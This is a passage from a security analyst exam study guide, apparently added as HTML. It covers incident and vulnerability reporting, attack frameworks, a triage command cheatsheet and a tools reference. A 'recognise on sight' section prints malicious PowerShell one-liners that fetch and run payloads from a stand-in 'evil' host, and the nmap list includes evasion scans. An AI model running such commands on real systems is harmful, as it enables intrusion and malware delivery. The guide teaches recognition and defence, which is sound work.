+<li>Why does the Cyber Kill Chain fit a credential-stuffing attack poorly?</li>
+<li>You isolate a host with EDR rather than powering it off. Why?</li>
+<li>What must be true of a backup before you restore from it?</li>
+<li>What is the risk of running the incident bridge on corporate email?</li>
+<li>Eradication removed the malware but the host was reinfected in a week. Which step was skipped?</li>
+</ol></section><section class="section" id="04-reporting-communication"><h1 id="domain-4-reporting-and-communication-17">Domain 4 — Reporting and Communication (17%)</h1>
+<p>The smallest domain and the one technical people most often underestimate. Its premise: analysis nobody acts on is worthless. Expect scenario questions about</p>
+<p><em>who</em> to tell, <em>when</em>, and <em>in what language</em>.</p>
+<hr>
+<h2 id="4-1-vulnerability-management-reporting-and-communication">4.1 Vulnerability management reporting and communication</h2>
+<h3 id="what-goes-in-a-vulnerability-report">What goes in a vulnerability report</h3>
+<ul>
+<li><strong>Vulnerability details</strong> — CVE, description, affected assets, evidence.</li>
+<li><strong>Affected hosts</strong> — with owner and business function, not just IP.</li>
+<li><strong>Risk score</strong> — CVSS, plus contextual adjustment for your environment.</li>
+<li><strong>Mitigation</strong> — the concrete fix or compensating control.</li>
+<li><strong>Recurrence</strong> — has this been reported before? Recurrence points at a broken process (golden image, config drift), not a lazy admin.</li>
+<li><strong>Prioritisation</strong> — ranked, with the ranking rationale stated.</li>
+</ul>
+<h3 id="compliance-reports">Compliance reports</h3>
+<p>Evidence for auditors and regulators: scan coverage, findings, remediation status, exceptions, and the timeline. Mapped to the framework in question (PCI DSS, HIPAA, SOX, ISO 27001, FedRAMP).</p>
+<h3 id="action-plans">Action plans</h3>
+<ul>
+<li><strong>Configuration management</strong> — the change record for every fix.</li>
+<li><strong>Patching</strong> — schedule, rollback plan, verification.</li>
+<li><strong>Compensating controls</strong> — where patching is impossible.</li>
+<li><strong>Awareness, training, and education</strong> — when the root cause is human.</li>
+</ul>
+<h3 id="inhibitors-to-remediation">Inhibitors to remediation</h3>
+<p>Know these by name; the exam asks which one a scenario describes.</p>
+<div class="tw"><table><thead><tr><th>Inhibitor</th><th>Meaning</th></tr></thead><tbody><tr><td><strong>MOU (Memorandum of Understanding)</strong></td><td>Informal agreement constraining action</td></tr><tr><td><strong>SLA (Service Level Agreement)</strong></td><td>Uptime commitments limit when you can patch</td></tr><tr><td><strong>Organisational governance</strong></td><td>Approval chains and change advisory boards</td></tr><tr><td><strong>Business process interruption</strong></td><td>The fix breaks a revenue-generating process</td></tr><tr><td><strong>Degrading functionality</strong></td><td>The patch removes a feature the business relies on</td></tr><tr><td><strong>Legacy systems</strong></td><td>Unsupported, unpatchable, still load-bearing</td></tr><tr><td><strong>Proprietary systems</strong></td><td>Vendor prohibits modification or voids support</td></tr></tbody></table></div>
+<p>The correct analyst response to an inhibitor is never &quot;patch anyway&quot; — it is</p>
+<p><strong>document the risk, propose compensating controls, and escalate the acceptance decision to the business owner.</strong></p>
+<h3 id="metrics-and-key-performance-indicators">Metrics and key performance indicators</h3>
+<ul>
+<li><strong>Trends</strong> — is risk going up or down over time? Direction beats snapshots.</li>
+<li><strong>Top 10</strong> — most prevalent or highest-risk findings.</li>
+<li><strong>Critical vulnerabilities and zero-days</strong> — reported separately, immediately.</li>
+<li><strong>SLO (service level objective)</strong> — remediation targets and adherence rate.</li>
+<li><strong>Coverage</strong>, <strong>MTTR</strong>, <strong>recurrence rate</strong>, <strong>risk burn-down</strong>.</li>
+</ul>
+<h3 id="stakeholder-identification-and-communication">Stakeholder identification and communication</h3>
+<div class="tw"><table><thead><tr><th>Audience</th><th>What they need</th><th>Language</th></tr></thead><tbody><tr><td><strong>Executive / board</strong></td><td>Business risk, trend, spend justification</td><td>One page, no CVEs, money and risk</td></tr><tr><td><strong>Risk / compliance</strong></td><td>Framework mapping, exceptions, evidence</td><td>Control language</td></tr><tr><td><strong>System owners / IT ops</strong></td><td>Exactly what to fix on which host, and by when</td><td>Technical, actionable</td></tr><tr><td><strong>Developers</strong></td><td>Code location, class of flaw, secure pattern</td><td>Code-level</td></tr><tr><td><strong>Legal / privacy</strong></td><td>Regulatory exposure, notification duties</td><td>Obligation-focused</td></tr></tbody></table></div>
+<p><strong>Rule of thumb the exam rewards:</strong> match the abstraction level to the audience. A CVSS vector string in a board deck is a communication failure.</p>
+<hr>
+<h2 id="4-2-incident-response-reporting-and-communication">4.2 Incident response reporting and communication</h2>
+<h3 id="stakeholder-identification-and-communication">Stakeholder identification and communication</h3>
+<p>Who gets told, and when, is a <strong>plan decision made in advance</strong> — not an improvisation during the incident.</p>
+<p>Typical stakeholders: incident response team, IT operations, executive leadership, <strong>legal counsel</strong>, HR (insider cases), public relations / communications, affected business units, customers, law enforcement, regulators, cyber-insurance carrier, and third-party IR retainer.</p>
+<p><strong>Critical points:</strong></p>
+<ul>
+<li><strong>Legal is involved early</strong>, both for regulatory duties and to establish attorney–client privilege over the investigation where applicable.</li>
+<li><strong>Communicate out-of-band</strong> if the corporate network or mail may be compromised.</li>
+<li><strong>Limit distribution</strong> on a need-to-know basis during an active incident.</li>
+<li><strong>Single source of truth</strong> — one designated spokesperson externally; avoid contradictory statements.</li>
+<li>Never speculate publicly about attribution or scope before it is established.</li>
+</ul>
+<h3 id="incident-declaration-and-escalation">Incident declaration and escalation</h3>
+<ul>
+<li><strong>Declaration</strong> — the formal moment an event becomes an incident, triggering the plan. Defined criteria prevent both under- and over-reaction.</li>
+<li><strong>Escalation</strong> — predefined thresholds and timeframes decide who is woken. Escalate on severity, on scope expansion, on regulatory trigger, or when the response needs authority you don&#x27;t have.</li>
+</ul>
+<h3 id="incident-response-reporting-required-content">Incident response reporting — required content</h3>
+<ul>
+<li><strong>Executive summary</strong> — plain language, front-loaded, readable by a non-technical executive. What happened, what was affected, what you did, what it means, what&#x27;s next.</li>
+<li><strong>Who, what, when, where, and why</strong> — the factual narrative.</li>
+<li><strong>Timeline</strong> — the spine of the report. Timestamps with time zone, correlated across sources.</li>
+<li><strong>Scope</strong> — systems, accounts, and data affected; and explicitly what was <em>not</em> affected.</li>
+<li><strong>Impact</strong> — operational, financial, reputational, regulatory.</li>
+<li><strong>Evidence</strong> — with chain of custody references.</li>
+<li><strong>Recommendations</strong> — prioritised, owned, dated.</li>
+<li><strong>Lessons learned</strong> — what changes structurally.</li>
+</ul>
+<p>Write to be read by someone six months later who wasn&#x27;t there — that&#x27;s the test of a good incident report.</p>
+<h3 id="legal-and-regulatory-considerations">Legal and regulatory considerations</h3>
+<ul>
+<li><strong>Breach notification timelines</strong> vary by regime. <strong>GDPR: 72 hours</strong> to the supervisory authority from becoming aware — the most-quoted number on the exam. Others (HIPAA, state breach laws, SEC disclosure rules, PCI DSS) differ; know that the obligation exists and that <strong>legal determines it</strong>, not you.</li>
+<li><strong>Evidence preservation and legal hold</strong> obligations begin early.</li>
+<li><strong>Law enforcement engagement</strong> — a decision made by leadership and legal; it can constrain your remediation timeline.</li>
+<li><strong>Cyber-insurance</strong> — carriers often require prompt notification and may mandate their own IR firm. Failing to notify can void coverage.</li>
+<li><strong>Regulatory reporting</strong> — sector-specific (financial, healthcare, critical infrastructure).</li>
+</ul>
+<h3 id="root-cause-analysis-in-the-report">Root cause analysis in the report</h3>
+<p>State the <em>structural</em> cause and the control that failed, not the individual who made a mistake. Blame produces silence; blameless analysis produces information.</p>
+<h3 id="lessons-learned">Lessons learned</h3>
+<p>Document what worked, what didn&#x27;t, what was missing (visibility gaps, tooling gaps, authority gaps), and the tracked actions arising, each with an owner and a due date.</p>
+<h3 id="metrics-and-kpis-for-incident-response">Metrics and KPIs for incident response</h3>
+<ul>
+<li><strong>MTTD</strong>, <strong>MTTA</strong>, <strong>MTTR</strong>, <strong>dwell time</strong></li>
+<li>Number of incidents by category and severity</li>
+<li><strong>Alert volume</strong> and <strong>false positive rate</strong></li>
+<li>Percentage of incidents detected internally vs reported externally — a low internal-detection rate is a damning visibility metric</li>
+<li>Recurrence of incident types</li>
+</ul>
+<hr>
+<h2 id="domain-4-self-check">Domain 4 self-check</h2>
+<ol>
+<li>Your executive summary opens with &quot;The threat actor leveraged CVE-2023-1234 to achieve RCE via a deserialisation flaw.&quot; What&#x27;s wrong with it?</li>
+<li>Name four inhibitors to remediation and the correct analyst response to each.</li>
+<li>Under GDPR, how long do you have to notify the supervisory authority?</li>
+<li>Why might the incident bridge be run on a channel outside corporate IT?</li>
+<li>What does a high ratio of externally-reported incidents tell you?</li>
+<li>A patch would break a revenue-critical legacy app. What do you do?</li>
+</ol></section><section class="section" id="frameworks"><h1 id="frameworks-side-by-side">Frameworks Side by Side</h1>
+<p>A single page for the comparison questions.</p>
+<h2 id="attack-frameworks">Attack frameworks</h2>
+<div class="tw"><table><thead><tr><th></th><th>Cyber Kill Chain</th><th>Diamond Model</th><th>MITRE ATT&amp;CK</th><th>Unified Kill Chain</th></tr></thead><tbody><tr><td><strong>Shape</strong></td><td>7 linear stages</td><td>4 connected vertices</td><td>Matrix of tactics × techniques</td><td>18 phases</td></tr><tr><td><strong>Best for</strong></td><td>Explaining an intrusion to leadership</td><td>Pivoting during analysis; actor clustering</td><td>Detection coverage; shared vocabulary</td><td>End-to-end incl. internal movement</td></tr><tr><td><strong>Weakness</strong></td><td>Linear, malware/perimeter-centric</td><td>Not a process; no defensive guidance</td><td>Large; not a narrative</td><td>Complex</td></tr><tr><td><strong>Use it when</strong></td><td>Reporting</td><td>Investigating</td><td>Mapping detections</td><td>Modelling full campaigns</td></tr></tbody></table></div>
+<h3 id="kill-chain-att-ck-rough-mapping">Kill Chain ↔ ATT&amp;CK rough mapping</h3>
+<div class="tw"><table><thead><tr><th>Kill Chain</th><th>ATT&amp;CK tactics</th></tr></thead><tbody><tr><td>Reconnaissance</td><td>Reconnaissance, Resource Development</td></tr><tr><td>Weaponisation</td><td>Resource Development</td></tr><tr><td>Delivery</td><td>Initial Access</td></tr><tr><td>Exploitation</td><td>Execution</td></tr><tr><td>Installation</td><td>Persistence, Privilege Escalation, Defense Evasion</td></tr><tr><td>C2</td><td>Command and Control</td></tr><tr><td>Actions on Objectives</td><td>Credential Access, Discovery, Lateral Movement, Collection, Exfiltration, Impact</td></tr></tbody></table></div>
+<h2 id="incident-response-process">Incident response process</h2>
+<div class="tw"><table><thead><tr><th>NIST SP 800-61 (4 phases)</th><th>SANS (6 steps)</th></tr></thead><tbody><tr><td>Preparation</td><td>Preparation</td></tr><tr><td>Detection and Analysis</td><td>Identification</td></tr><tr><td>Containment, Eradication, and Recovery</td><td>Containment</td></tr><tr><td>&quot;</td><td>Eradication</td></tr><tr><td>&quot;</td><td>Recovery</td></tr><tr><td>Post-Incident Activity</td><td>Lessons Learned</td></tr></tbody></table></div>
+<h2 id="nist-cybersecurity-framework-functions">NIST Cybersecurity Framework functions</h2>
+<p><strong>Govern</strong> (CSF 2.0) · <strong>Identify</strong> · <strong>Protect</strong> · <strong>Detect</strong> · <strong>Respond</strong> · <strong>Recover</strong></p>
+<h2 id="threat-modelling">Threat modelling</h2>
+<div class="tw"><table><thead><tr><th>Model</th><th>Structure</th></tr></thead><tbody><tr><td><strong>STRIDE</strong></td><td>Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege</td></tr><tr><td><strong>DREAD</strong></td><td>Damage, Reproducibility, Exploitability, Affected users, Discoverability (risk rating)</td></tr><tr><td><strong>PASTA</strong></td><td>Process for Attack Simulation and Threat Analysis — 7 risk-centric stages</td></tr><tr><td><strong>Attack trees</strong></td><td>Goal at the root, attack paths as branches</td></tr></tbody></table></div>
+<h2 id="pyramid-of-pain-bottom-easy-for-adversary-to-change">Pyramid of Pain (bottom = easy for adversary to change)</h2>
+<pre><code>            TTPs                  ← Tough!
+         Tools                    ← Challenging
+   Network/Host Artifacts         ← Annoying
+       Domain Names               ← Simple
+       IP Addresses               ← Easy
+       Hash Values                ← Trivial</code></pre>
+<p>Detect higher up and you force the adversary to retool, not just re-register.</p>
+<h2 id="traffic-light-protocol">Traffic Light Protocol</h2>
+<div class="tw"><table><thead><tr><th>Marking</th><th>Share with</th></tr></thead><tbody><tr><td><code>TLP:RED</code></td><td>Named recipients only — no onward sharing</td></tr><tr><td><code>TLP:AMBER</code></td><td>Recipient&#x27;s organisation and clients, need-to-know</td></tr><tr><td><code>TLP:AMBER+STRICT</code></td><td>Recipient&#x27;s organisation only</td></tr><tr><td><code>TLP:GREEN</code></td><td>The community / peer organisations — not public</td></tr><tr><td><code>TLP:CLEAR</code></td><td>Unrestricted; public release permitted</td></tr></tbody></table></div>
+<h2 id="owasp-top-10-2021">OWASP Top 10 (2021)</h2>
+<ol>
+<li>Broken Access Control</li>
+<li>Cryptographic Failures</li>
+<li>Injection (incl. XSS)</li>
+<li>Insecure Design</li>
+<li>Security Misconfiguration</li>
+<li>Vulnerable and Outdated Components</li>
+<li>Identification and Authentication Failures</li>
+<li>Software and Data Integrity Failures</li>
+<li>Security Logging and Monitoring Failures</li>
+<li>Server-Side Request Forgery (SSRF)</li>
+</ol>
+<h2 id="risk-formulas">Risk formulas</h2>
+<pre><code>SLE = Asset Value × Exposure Factor
+ALE = SLE × ARO
+Risk = Threat × Vulnerability × Impact
+Residual Risk = Inherent Risk − Control Effectiveness</code></pre>
+<h2 id="risk-response-options">Risk response options</h2>
+<p><strong>Mitigate</strong> (apply controls) · <strong>Transfer</strong> (insure/contract) · <strong>Avoid</strong> (stop the activity) · <strong>Accept</strong> (document and own it)</p></section><section class="section" id="commands-cheatsheet"><h1 id="command-line-cheatsheet">Command-Line Cheatsheet</h1>
+<p>Performance-based questions hand you output and ask what happened. Read fluently.</p>
+<hr>
+<h2 id="nmap">nmap</h2>
+<pre><code class="lang-bash">nmap -sn 10.0.0.0/24              # ping sweep, host discovery only, no port scan
+nmap -sS -p- 10.0.0.5             # SYN (half-open) scan, all 65535 ports
+nmap -sT 10.0.0.5                 # full TCP connect scan (no raw socket privs needed)
+nmap -sU --top-ports 100 10.0.0.5 # UDP scan (slow)
+nmap -sV -O 10.0.0.5              # service version + OS fingerprint
+nmap -A 10.0.0.5                  # aggressive: -sV -O --script=default --traceroute
+nmap -sC 10.0.0.5                 # default NSE scripts
+nmap --script vuln 10.0.0.5       # vulnerability NSE category
+nmap -Pn 10.0.0.5                 # skip host discovery (target blocks ping)
+nmap -T4 10.0.0.5                 # timing template 0(paranoid)–5(insane)
+nmap -oA scan                     # output all formats: .nmap .xml .gnmap
+nmap -sS -D RND:10 10.0.0.5       # decoy scan (evasion)
+nmap -f 10.0.0.5                  # fragment packets (evasion)</code></pre>
+<p><strong>Port states:</strong> <code>open</code> · <code>closed</code> (RST returned) · <code>filtered</code> (no response — firewall dropping) · <code>open|filtered</code> (UDP ambiguity) · <code>unfiltered</code>.</p>
+<hr>
+<h2 id="tcpdump">tcpdump</h2>
+<pre><code class="lang-bash">tcpdump -i eth0 -nn -s0 -w cap.pcap        # capture full packets, no name resolution
+tcpdump -r cap.pcap                        # read back
+tcpdump -i eth0 host 10.0.0.5
+tcpdump -i eth0 net 10.0.0.0/24
+tcpdump -i eth0 port 443
+tcpdump -i eth0 src 10.0.0.5 and dst port 53
+tcpdump -i eth0 &#x27;tcp[tcpflags] &amp; tcp-syn != 0&#x27;   # SYN packets
+tcpdump -i eth0 -A port 80                 # print payload as ASCII
+tcpdump -i eth0 -c 100                     # stop after 100 packets</code></pre>
+<p><code>-nn</code> (no DNS/port name lookup) and <code>-s0</code> (full snaplen) are the two flags to memorise. Capture to disk, analyse afterwards.</p>
+<hr>
+<h2 id="wireshark-display-filters">Wireshark display filters</h2>
+<pre><code>ip.addr == 10.0.0.5
+ip.src == 10.0.0.5 &amp;&amp; ip.dst == 8.8.8.8
+tcp.port == 445
+http.request.method == &quot;POST&quot;
+dns.qry.name contains &quot;evil&quot;
+tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0     # SYN only — scan detection
+tcp.analysis.retransmission
+frame contains &quot;password&quot;
+http.response.code == 500
+smtp || pop || imap</code></pre>
+<blockquote><strong>Capture filters use BPF syntax</strong> (<code>host x</code>, <code>port y</code>) — display filters do not. Mixing them up is a classic mistake.</blockquote>
+<hr>
+<h2 id="linux-triage">Linux triage</h2>
+<pre><code class="lang-bash">ps aux --forest                    # process tree
+ps -eo pid,ppid,user,cmd           # parent-child lineage
+lsof -i                            # open network connections by process
+lsof -p 1234                       # files open by a PID
+netstat -antp   /   ss -antp       # listening + established sockets with PIDs
+top / htop                         # live resource use
+last / lastb                       # successful / failed logins
+w / who                            # currently logged in
+crontab -l ; ls -la /etc/cron.*    # scheduled task persistence
+cat /etc/passwd ; cat /etc/shadow  # accounts
+find / -perm -4000 -type f 2&gt;/dev/null   # setuid binaries (privesc hunt)
+find / -mtime -1 -type f 2&gt;/dev/null     # files modified in last 24h
+stat suspicious_file               # MAC times
+history                            # shell history
+journalctl -u sshd --since &quot;1 hour ago&quot;
+grep &quot;Failed password&quot; /var/log/auth.log | awk &#x27;{print $11}&#x27; | sort | uniq -c | sort -rn</code></pre>
+<hr>
+<h2 id="log-analysis-idioms">Log analysis idioms</h2>
+<pre><code class="lang-bash"># Top source IPs in a web log
+awk &#x27;{print $1}&#x27; access.log | sort | uniq -c | sort -rn | head -20
+
+# All 500 errors
+awk &#x27;$9 == 500&#x27; access.log
+
+# Extract every IPv4 address from a file
+grep -oE &#x27;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&#x27; file.log | sort -u
+
+# Count requests per hour
+awk &#x27;{print substr($4,2,14)}&#x27; access.log | uniq -c
+
+# Find long URLs (possible injection / exfil)
+awk &#x27;length($7) &gt; 200&#x27; access.log
+
+# Unique user agents
+awk -F&#x27;&quot;&#x27; &#x27;{print $6}&#x27; access.log | sort | uniq -c | sort -rn</code></pre>
+<hr>
+<h2 id="windows-triage">Windows triage</h2>
+<pre><code class="lang-powershell">Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
+Get-CimInstance Win32_Process | Select ProcessId,ParentProcessId,Name,CommandLine
+Get-NetTCPConnection -State Established
+Get-Service | Where-Object {$_.Status -eq &quot;Running&quot;}
+Get-ScheduledTask | Where-Object {$_.State -ne &quot;Disabled&quot;}
+Get-LocalUser ; Get-LocalGroupMember Administrators
+Get-WinEvent -FilterHashtable @{LogName=&#x27;Security&#x27;; ID=4625} -MaxEvents 50
+Get-FileHash .\suspect.exe -Algorithm SHA256
+Get-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</code></pre>
+<pre><code class="lang-cmd">tasklist /v
+netstat -anob
+wmic process get name,processid,parentprocessid,commandline
+schtasks /query /fo LIST /v
+net user ; net localgroup administrators
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></pre>
+<p><strong>Key Windows Security Event IDs</strong></p>
+<div class="tw"><table><thead><tr><th>ID</th><th>Meaning</th></tr></thead><tbody><tr><td>4624</td><td>Successful logon (check <strong>Logon Type</strong>: 2 interactive, 3 network, 10 RDP)</td></tr><tr><td>4625</td><td>Failed logon</td></tr><tr><td>4634 / 4647</td><td>Logoff</td></tr><tr><td>4648</td><td>Logon with explicit credentials (runas — lateral movement tell)</td></tr><tr><td>4672</td><td>Special privileges assigned (admin logon)</td></tr><tr><td>4688</td><td>Process creation (enable command-line auditing!)</td></tr><tr><td>4697 / 7045</td><td>Service installed</td></tr><tr><td>4698</td><td>Scheduled task created</td></tr><tr><td>4719</td><td>Audit policy changed (defence evasion)</td></tr><tr><td>4720</td><td>User account created</td></tr><tr><td>4726</td><td>User account deleted</td></tr><tr><td>1102</td><td><strong>Audit log cleared</strong> — always investigate</td></tr><tr><td>5140</td><td>Network share accessed</td></tr></tbody></table></div>
+<hr>
+<h2 id="malicious-powershell-recognise-on-sight">Malicious PowerShell — recognise on sight</h2>
+<pre><code class="lang-powershell">powershell.exe -nop -w hidden -ExecutionPolicy Bypass -EncodedCommand &lt;base64&gt;
+IEX (New-Object Net.WebClient).DownloadString(&#x27;http://evil/a.ps1&#x27;)
+Invoke-WebRequest -Uri http://evil/x.exe -OutFile $env:TEMP\x.exe
+[System.Convert]::FromBase64String($payload)</code></pre>
+<p>Decode base64 to see the real command:</p>
+<pre><code class="lang-bash">echo &#x27;&lt;base64&gt;&#x27; | base64 -d | iconv -f UTF-16LE -t UTF-8</code></pre>
+<hr>
+<h2 id="hashing-and-file-analysis">Hashing and file analysis</h2>
+<pre><code class="lang-bash">sha256sum file ; md5sum file
+file suspicious.bin                # identify type by magic bytes
+strings -n 8 suspicious.bin | less # readable strings (URLs, IPs, commands)
+xxd suspicious.bin | head          # hex dump
+exiftool image.jpg                 # metadata
+binwalk firmware.bin               # embedded files
+objdump -d binary                  # disassemble
+readelf -h binary                  # ELF headers</code></pre>
+<p>High entropy across the whole file suggests packing or encryption.</p>
+<hr>
+<h2 id="dns-and-osint">DNS and OSINT</h2>
+<pre><code class="lang-bash">dig example.com ANY
+dig +short example.com MX
+dig -x 8.8.8.8                     # reverse lookup
+nslookup example.com
+whois example.com                  # registration date matters
+host -t txt example.com            # SPF/DMARC records live in TXT
+dig _dmarc.example.com TXT
+theHarvester -d example.com -b all</code></pre>
+<hr>
+<h2 id="curl-for-quick-web-checks">curl for quick web checks</h2>
+<pre><code class="lang-bash">curl -I https://example.com                    # headers only
+curl -sk https://10.0.0.5 -o /dev/null -w &#x27;%{http_code}\n&#x27;
+curl -H &quot;User-Agent: test&quot; -X POST -d &#x27;a=1&#x27; https://example.com
+curl -s https://example.com | grep -i &#x27;X-Powered-By&#x27;</code></pre></section><section class="section" id="tools-reference"><h1 id="tools-reference">Tools Reference</h1>
+<p>What each named tool does, and the sentence an exam answer wants.</p>
+<h2 id="network-scanning-and-discovery">Network scanning and discovery</h2>
+<div class="tw"><table><thead><tr><th>Tool</th><th>Use it for</th></tr></thead><tbody><tr><td><strong>Nmap</strong></td><td>Host discovery, port/service/version detection, OS fingerprinting, NSE scripting</td></tr><tr><td><strong>Angry IP Scanner</strong></td><td>Fast, simple host/port sweep</td></tr><tr><td><strong>Masscan</strong></td><td>Internet-scale port scanning</td></tr><tr><td><strong>hping3</strong></td><td>Custom packet crafting, firewall rule testing, traceroute over arbitrary protocols</td></tr><tr><td><strong>Responder</strong></td><td>LLMNR/NBT-NS poisoning to capture hashes (offensive)</td></tr></tbody></table></div>
+<h2 id="vulnerability-scanning">Vulnerability scanning</h2>
+<div class="tw"><table><thead><tr><th>Tool</th><th>Use it for</th></tr></thead><tbody><tr><td><strong>Nessus / Tenable.io</strong></td><td>Commercial general vulnerability scanning</td></tr><tr><td><strong>Qualys</strong></td><td>Cloud-delivered vulnerability management</td></tr><tr><td><strong>OpenVAS / Greenbone</strong></td><td>Open-source vulnerability scanner</td></tr><tr><td><strong>Rapid7 Nexpose / InsightVM</strong></td><td>Vulnerability management with risk scoring</td></tr><tr><td><strong>Nikto</strong></td><td>Web server misconfiguration and dangerous-file checks</td></tr><tr><td><strong>OpenSCAP</strong></td><td>SCAP-based compliance/configuration scanning</td></tr></tbody></table></div>
+<h2 id="web-application">Web application</h2>
+<div class="tw"><table><thead><tr><th>Tool</th><th>Use it for</th></tr></thead><tbody><tr><td><strong>Burp Suite</strong></td><td>Intercepting proxy, repeater, intruder, scanner — the standard web testing toolkit</td></tr><tr><td><strong>OWASP ZAP</strong></td><td>Open-source intercepting proxy and DAST scanner</td></tr><tr><td><strong>Arachni / w3af</strong></td><td>Automated web application scanning</td></tr><tr><td><strong>sqlmap</strong></td><td>Automated SQL injection detection and exploitation</td></tr><tr><td><strong>Gobuster / dirb / ffuf</strong></td><td>Content and directory brute-forcing</td></tr><tr><td><strong>wpscan</strong></td><td>WordPress-specific enumeration</td></tr></tbody></table></div>
+<h2 id="packet-capture-and-network-analysis">Packet capture and network analysis</h2>
+<div class="tw"><table><thead><tr><th>Tool</th><th>Use it for</th></tr></thead><tbody><tr><td><strong>Wireshark</strong></td><td>GUI packet analysis, stream reassembly, object export</td></tr><tr><td><strong>tcpdump</strong></td><td>CLI capture on servers and headless hosts</td></tr><tr><td><strong>tshark</strong></td><td>Wireshark&#x27;s CLI — scriptable capture analysis</td></tr><tr><td><strong>NetworkMiner</strong></td><td>Network forensic artefact extraction from pcap</td></tr><tr><td><strong>Zeek (Bro)</strong></td><td>Network security monitoring — turns traffic into rich structured logs</td></tr><tr><td><strong>Suricata / Snort</strong></td><td>Signature-based IDS/IPS</td></tr><tr><td><strong>SiLK / nfdump</strong></td><td>NetFlow collection and analysis</td></tr><tr><td><strong>p0f</strong></td><td>Passive OS fingerprinting</td></tr></tbody></table></div>
+<h2 id="endpoint-and-forensics">Endpoint and forensics</h2>
+<div class="tw"><table><thead><tr><th>Tool</th><th>Use it for</th></tr></thead><tbody><tr><td><strong>Volatility</strong></td><td>Memory forensics — process lists, injected code, network connections from a RAM image</td></tr><tr><td><strong>Autopsy / The Sleuth Kit</strong></td><td>Disk forensics, timeline, deleted file recovery</td></tr><tr><td><strong>FTK Imager / dd / dc3dd</strong></td><td>Forensic imaging</td></tr><tr><td><strong>Sysinternals (Procmon, Procexp, Autoruns, TCPView)</strong></td><td>Live Windows triage; Autoruns is the persistence-hunting tool</td></tr><tr><td><strong>Velociraptor / GRR</strong></td><td>Endpoint hunting at scale</td></tr><tr><td><strong>YARA</strong></td><td>Pattern-matching rules to classify malware families</td></tr><tr><td><strong>Sysmon</strong></td><td>Enhanced Windows telemetry (deploy it; the default log is too thin)</td></tr></tbody></table></div>
+<h2 id="malware-and-binary-analysis">Malware and binary analysis</h2>
+<div class="tw"><table><thead><tr><th>Tool</th><th>Use it for</th></tr></thead><tbody><tr><td><strong>Cuckoo Sandbox / Any.Run / Joe Sandbox</strong></td><td>Dynamic analysis by detonation</td></tr><tr><td><strong>Ghidra / IDA Pro / radare2</strong></td><td>Disassembly and decompilation</td></tr><tr><td><strong>GDB / WinDbg / OllyDbg / Immunity</strong></td><td>Debugging</td></tr><tr><td><strong>PEStudio / pefile</strong></td><td>Static PE inspection: imports, sections, entropy</td></tr><tr><td><strong>strings / floss</strong></td><td>Extract readable strings, including obfuscated ones</td></tr><tr><td><strong>CyberChef</strong></td><td>Decode, deobfuscate, and transform data — &quot;the cyber Swiss Army knife&quot;</td></tr></tbody></table></div>
+<h2 id="siem-soar-and-monitoring">SIEM, SOAR, and monitoring</h2>
+<div class="tw"><table><thead><tr><th>Tool</th><th>Use it for</th></tr></thead><tbody><tr><td><strong>Splunk</strong></td><td>SIEM with SPL query language</td></tr><tr><td><strong>Elastic Stack / ELK</strong></td><td>Open search-based log analytics</td></tr><tr><td><strong>Microsoft Sentinel</strong></td><td>Cloud-native SIEM, KQL</td></tr><tr><td><strong>QRadar / ArcSight / LogRhythm</strong></td><td>Enterprise SIEM platforms</td></tr><tr><td><strong>Wazuh / OSSEC</strong></td><td>Open-source HIDS with FIM and log analysis</td></tr><tr><td><strong>Security Onion</strong></td><td>Free NSM/IDS distribution bundling Zeek, Suricata, Elastic</td></tr><tr><td><strong>TheHive / Cortex</strong></td><td>Case management and observable analysis</td></tr><tr><td><strong>Shuffle / Tines / Phantom</strong></td><td>SOAR playbook automation</td></tr><tr><td><strong>Grafana / Kibana</strong></td><td>Dashboards and visualisation</td></tr></tbody></table></div>
+<h2 id="threat-intelligence">Threat intelligence</h2>
+<div class="tw"><table><thead><tr><th>Tool</th><th>Use it for</th></tr></thead><tbody><tr><td><strong>MISP</strong></td><td>Threat intelligence sharing platform</td></tr><tr><td><strong>OpenCTI</strong></td><td>Threat intelligence knowledge management</td></tr><tr><td><strong>VirusTotal</strong></td><td>Multi-engine file/URL/hash reputation</td></tr><tr><td><strong>Shodan / Censys</strong></td><td>Internet-wide device and service search — attack surface discovery</td></tr><tr><td><strong>Maltego</strong></td><td>Link analysis and OSINT graphing</td></tr><tr><td><strong>Recon-ng / theHarvester / SpiderFoot</strong></td><td>OSINT collection frameworks</td></tr><tr><td><strong>urlscan.io</strong></td><td>Safe URL detonation and page analysis</td></tr></tbody></table></div>
+<h2 id="cloud-and-container">Cloud and container</h2>
+<div class="tw"><table><thead><tr><th>Tool</th><th>Use it for</th></tr></thead><tbody><tr><td><strong>Prowler</strong></td><td>AWS/Azure/GCP security posture assessment</td></tr><tr><td><strong>ScoutSuite</strong></td><td>Multi-cloud auditing</td></tr><tr><td><strong>Pacu</strong></td><td>Offensive AWS exploitation framework</td></tr><tr><td><strong>Trivy / Grype / Clair / Anchore</strong></td><td>Container image and dependency vulnerability scanning</td></tr><tr><td><strong>Falco</strong></td><td>Runtime container threat detection</td></tr><tr><td><strong>kube-bench / kube-hunter</strong></td><td>Kubernetes CIS benchmark and vulnerability testing</td></tr></tbody></table></div>
+<h2 id="exploitation-and-offensive">Exploitation and offensive</h2>
+<div class="tw"><table><thead><tr><th>Tool</th><th>Use it for</th></tr></thead><tbody><tr><td><strong>Metasploit Framework</strong></td><td>Exploit development and delivery; module availability changes prioritisation</td></tr><tr><td><strong>Cobalt Strike</strong></td><td>Commercial C2 — heavily abused by real adversaries; know its Beacon traffic</td></tr><tr><td><strong>Empire / Sliver / Mythic</strong></td><td>Post-exploitation C2 frameworks</td></tr><tr><td><strong>BloodHound</strong></td><td>Maps Active Directory attack paths — &quot;shortest path to Domain Admin&quot;</td></tr><tr><td><strong>Mimikatz</strong></td><td>Credential dumping from LSASS</td></tr><tr><td><strong>Hashcat / John the Ripper</strong></td><td>Password cracking</td></tr><tr><td><strong>Aircrack-ng / Reaver</strong></td><td>Wireless assessment</td></tr><tr><td><strong>Social-Engineer Toolkit (SET)</strong></td><td>Phishing and social engineering simulation</td></tr></tbody></table></div>
+<h2 id="email-security">Email security</h2>
